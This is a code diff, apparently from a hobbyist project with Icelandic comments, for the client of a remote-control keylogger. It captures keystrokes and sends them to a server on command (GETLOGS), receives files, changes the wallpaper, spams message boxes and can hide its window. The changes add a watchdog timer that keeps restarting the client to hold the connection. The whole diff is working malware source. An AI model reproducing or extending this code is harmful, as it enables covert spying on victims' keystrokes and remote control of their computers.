@@ -5,6 +5,8 @@ using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Timers;
+using Timer = System.Timers.Timer;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using System.Text;
@@ -22,10 +24,14 @@ namespace client
         const int SW_HIDE = 0; //til að fela glugga ekki breyta
         public static string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         public static string fName;
+        public static Timer aTimer = new Timer(30000);
         static void Main()
         {
             Thread starter = new Thread(Connect);
             Thread starter2 = new Thread(Starting2);
+            Thread starter3 = new Thread(Starting3);
+
+
             // Activataðu þetta tvent til að KL'inn fari í background
             //var handle = GetConsoleWindow();
             //ShowWindow(handle, SW_HIDE);
@@ -54,8 +60,26 @@ namespace client
             InterceptKeys.Run(); //keyrir keyLoggið í gang 
 
         }
+        static void Starting3() //hérna fer tengingin í gang
+        {
+            aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
+            aTimer.Enabled = true;
+        }
 
-        static private void startup() //startuppið duhh
+        static void resettimer()
+        {
+            aTimer.Stop();
+            aTimer.Start();
+        }
+
+        private static void OnTimedEvent(object source, ElapsedEventArgs e)
+        {
+            client.Close(); //hérna er breyta notuð ef serverinn vill connecta við clientinn seinna.
+            Thread.Sleep(1000);
+            Application.Restart();
+            Process.GetCurrentProcess().Kill(); //var búinn að reyna að finna leið í meira en 2 klukkutíma en gafst upp á því og fer stytri leiðina með að restarta forritinu
+        }
+        static private void startup() //startuppið 
         {
             try
             {
@@ -86,7 +110,10 @@ namespace client
                 Thread.Sleep(100); //set smá delay svo 2 skilaboð eru ekki sent á sama tíma
                 Send("CONNECTED|"); //skilaboð um tengingu er sent hér
 
-                client.GetStream().BeginRead(new byte[0], 0, 0, Read, null); 
+                client.GetStream().BeginRead(new byte[0], 0, 0, Read, null);
+                resettimer();
+                Starting3();
+                
             }
             catch
             {
@@ -127,6 +154,7 @@ namespace client
                     {
 
                     }//Hérna er sent á breytuna messagebox sem keyrir messagebox popup
+                    resettimer();
                     break;
                 case "SPAMMERINO":
                     SendStatus("SPAM SUCCESSFULL"); 
@@ -134,25 +162,33 @@ namespace client
                     {
                         MessageBox.Show("Trololo", "Trolololino");
                     }
+                    resettimer();
                     break;
                 case "GETLOGS": 
                     SendLogs(); //sendir keylogging gögnin
+                    resettimer();
                     break;
                 case "STOP":
                     client.Close(); //hérna er breyta notuð ef serverinn vill connecta við clientinn seinna.
+                    Thread.Sleep(1000);
                     Application.Restart();
                     Process.GetCurrentProcess().Kill(); //var búinn að reyna að finna leið í meira en 2 klukkutíma en gafst upp á því og fer stytri leiðina með að restarta forritinu
+                    resettimer();
                     break;
                 case "FILE":
 
                     Server();
+                    resettimer();
 
                     break;
                 case "BGROUNDCHANGE": //breytir background myndinni
                     string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\" + fName; 
                     Uri uri = new System.Uri(path);
                     Wallpaper.Set(uri, Wallpaper.Style.Centered);
+                    SendStatus("BG Change: Successful");
+                    resettimer();
                     break;
+                    
 
             }
         }
@@ -176,6 +212,7 @@ namespace client
                 StreamWriter writer = new StreamWriter(client.GetStream());
                 writer.WriteLine("STATUS|" + msg);
                 writer.Flush();
+                resettimer();
             }
             catch
             {
@@ -191,6 +228,7 @@ namespace client
                 StreamWriter writer = new StreamWriter(client.GetStream());
                 writer.WriteLine("LOGS|" + userName + " " + msge + "          >>>>"); //var ekkert að vanda mig mikið en /n eða /r virkar ekki með þessu :(
                 writer.Flush();
+                resettimer();
             }
             catch
             {
@@ -219,9 +257,10 @@ namespace client
                 fName = Encoding.ASCII.GetString(clientData, 4, fNameLen);
                 BinaryWriter write = new BinaryWriter(File.Open(path + "/" + fName, FileMode.Append));
                 write.Write(clientData, 4 + fNameLen, receivedByteLen - 4 - fNameLen);
+                Thread.Sleep(100);
                 write.Close();
                 clientSock.Close();
-
+                SendStatus("Data: Received");
             }
             catch
             {
